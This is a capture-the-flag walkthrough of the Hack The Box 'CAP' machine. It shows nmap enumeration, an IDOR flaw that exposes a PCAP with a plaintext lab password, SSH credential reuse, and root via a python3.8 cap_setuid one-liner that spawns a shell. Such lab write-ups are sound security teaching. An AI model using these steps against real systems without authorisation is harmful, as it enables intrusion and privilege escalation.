# CAP – Hack The Box Walkthrough

Target: CAP (HTB Machine)  
Platform: Hack The Box (VPN-based lab)

---

# 1. Connecting to Hack The Box (VPN Setup)

HTB machines are accessible only through their private network.

### Step 1: Download VPN File

- Go to **“Connect to HTB”**
- Download the `.ovpn` configuration file

---

### Step 2: Start VPN

```bash
sudo openvpn <file-name>.ovpn
```

### What is a VPN?

A **VPN (Virtual Private Network)**:

- Creates an encrypted tunnel over your internet connection  
- Places your system inside HTB’s private network  
- Allows access to internal machines  
- Masks your real IP  

---

# 2. DNS Mapping 

HTB machines often use domain names like:

```
machine.htb
```

These are not publicly resolvable.

### Fix: Edit Hosts File

```bash
sudo nano /etc/hosts
```

Add:

```
<IP>    machine.htb
```

---

### How DNS Resolution Works

When you access a domain:

1. Local Cache is checked  
2. `/etc/hosts` is checked  
3. DNS server is queried  

Since we manually added the entry:

 The system directly resolves the domain without external DNS

---

# 3. Initial Enumeration

### Nmap Scan

```bash
sudo nmap -sC -sV -v -A -O -Pn -oN initial <IP>
```

### Explanation

- `-sC`  Default scripts  
- `-sV`  Service version detection  
- `-v` Verbose  
- `-A`  Aggressive scan  
- `-O`  OS detection  
- `-Pn`  Treat host as up  
- `-oN`  Output to file  

---

### Open Ports

```
21 → FTP
22  SSH
80  HTTP
```

---

# 4. Web Enumeration

Visit:

```
http://<IP>
```

### Observations

- Dashboard present  
- Username visible: **nathan**  
- Many links are broken  

---

# 5. PCAP File Discovery

The dashboard contains downloadable **PCAP files**.

### What is a PCAP?

**PCAP (Packet Capture)**:

- Captures network traffic  
- Used by tools like Wireshark  
- Contains:
  - Requests
  - Responses
  - Credentials (if unencrypted)

---

### IDOR Vulnerability

The URL pattern:

```
/data/1
```

Changing the number:

```
/data/0
```

 Gives access to different files

---

### Vulnerability: IDOR

**Insecure Direct Object Reference (IDOR)**

#### Intended Behavior:
- Users access only their own files

#### Fault:
- No access control checks

#### Impact:
- Access to sensitive data

---

# 6. Extracting Credentials

From `/data/0`, a PCAP file reveals:

```
Nathan:Buck3tH4TF0RM3!
```

---

# 7. SSH Access

We reuse credentials:

```bash
ssh nathan@<IP>
```

### Result

- Successful login  
- User shell obtained  

---

# 8. User Flag

Inside the system:

```bash
cat user.txt
```

---

# 9. Privilege Escalation

### Enumeration Tool

Run:

```bash
linpeas
```

---

### Discovery

Using:

```bash
getcap -r / 2>/dev/null
```

### What is getcap?

- Lists **file capabilities**
- Capabilities allow binaries to run with elevated privileges without full root

---

### Important Finding

```
python3.8 = cap_setuid+ep
```

---

# 10. Understanding the Vulnerability

### What is cap_setuid?

- Allows changing user ID  
- Normally restricted to root  

---

### Intended Use

- Controlled privilege management  

---

### Fault

- Python binary has this capability  
- Any user can escalate privileges  

---

# 11. Exploitation

Run:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

### Explanation

- `os.setuid(0)`  Switch to root user  
- `os.system("/bin/sh")`  Spawn shell  

---

# 12. Root Access

Now verify:

```bash
id
```

Output:

```
uid=0(root)
```

---

### Get Root Flag

```bash
cat /root/root.txt
```

---

# 13. Attack Chain Summary

```
VPN Connection
 DNS Mapping (/etc/hosts)
 Nmap Scan
 Web Enumeration
 IDOR Vulnerability
 PCAP Analysis
 Credential Extraction
 SSH Login
 Capability Enumeration
 Python Exploit (cap_setuid)
 Root Access
```

---

# 14. Key Takeaways

### 1. IDOR Vulnerability

- Missing access control  
- Leads to sensitive data exposure  

---

### 2. Credential Reuse

- Credentials often reused across services  
- Always test across SSH, FTP, web  

---

### 3. PCAP Analysis

- Network captures may contain plaintext credentials  
- Always inspect traffic files  

---

### 4. Linux Capabilities Misconfiguration

- Fine-grained privilege system  
- Misuse can lead to full root compromise  

---

# Conclusion

The CAP machine demonstrates a realistic attack path:

- Web vulnerability (IDOR)
- Credential leakage
- Privilege escalation via Linux capabilities  

A strong reminder that:

> Even small misconfigurations can lead to full system compromise.
